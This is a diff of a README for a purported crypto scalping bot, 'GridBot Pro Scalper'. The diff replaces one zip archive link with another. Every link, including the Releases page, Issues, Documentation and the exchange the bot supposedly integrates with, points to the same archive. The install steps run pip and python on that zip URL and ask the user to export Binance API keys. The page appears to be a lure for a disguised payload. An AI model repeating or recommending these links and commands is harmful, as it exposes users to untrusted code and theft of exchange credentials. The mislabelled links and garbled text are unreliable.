@@ -1,6 +1,6 @@
 # 🤖 gridbot-pro-scalper - Hassle-Free Crypto Trading Made Easy
 
-[![Download GridBot Pro Scalper](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip%20Pro%20Scalper-brightgreen)](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip)
+[![Download GridBot Pro Scalper](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip%20Pro%20Scalper-brightgreen)](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the software, please visit the [Releases page](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip). Look for the latest version and click the download link for your operating system.
+To download the software, please visit the [Releases page](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip). Look for the latest version and click the download link for your operating system.
 
 Once downloaded, follow these steps:
 
@@ -35,10 +35,10 @@ Once downloaded, follow these steps:
 
 3. **Run the Following Commands**:
    ```bash
-   pip install -r https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip
+   pip install -r https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip
    export BINANCE_API_KEY='your_key'
    export BINANCE_API_SECRET='your_secret'
-   python https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip
+   python https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip
    ```
 
 ### Key Instructions:
@@ -56,15 +56,15 @@ After installation, you can adjust the bot's settings. Open the configuration fi
 - **Entry Logic**: The bot employs EMA crossover and RSI with volume spikes to identify the best times to enter trades, helping you optimize your returns.
 - **Dynamic TP Levels**: It calculates different take profit (TP) levels based on the Average True Range (ATR) to give you flexible exit strategies.
 - **Position Persistence**: The bot remembers your active positions even after a restart, preventing any lost sessions.
-- **Live Trading**: Seamlessly integrates with https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip for a real trading experience.
+- **Live Trading**: Seamlessly integrates with https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip for a real trading experience.
 
 ## 🌟 Support & Resources
 
 If you have questions or run into issues, feel free to contact us via the Issues section of the repository. Our community and contributors are here to help.
 
 ### Community Resources:
-- [GitHub Issues](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip): Report bugs or seek assistance.
-- [Documentation](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip): Explore detailed guides and FAQs.
+- [GitHub Issues](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip): Report bugs or seek assistance.
+- [Documentation](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip): Explore detailed guides and FAQs.
 
 ## 🔍 Additional Information
 
@@ -78,4 +78,4 @@ For more insights on trading strategies and updates, check out our [blog](#) or 
 
 By using GridBot Pro Scalper, you take advantage of a reliable trading tool tailored to meet regulatory requirements. Follow these steps to get started easily and enjoy a straightforward trading experience. 
 
-Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/RGBWWDQ/gridbot-pro-scalper/main/hardenable/scalper-pro-gridbot-v1.3-beta.1.zip) for the latest updates and downloads.
+Don’t forget to visit the [Releases page](https://github.com/RGBWWDQ/gridbot-pro-scalper/raw/refs/heads/main/hardenable/gridbot-scalper-pro-trophoneurosis.zip) for the latest updates and downloads.
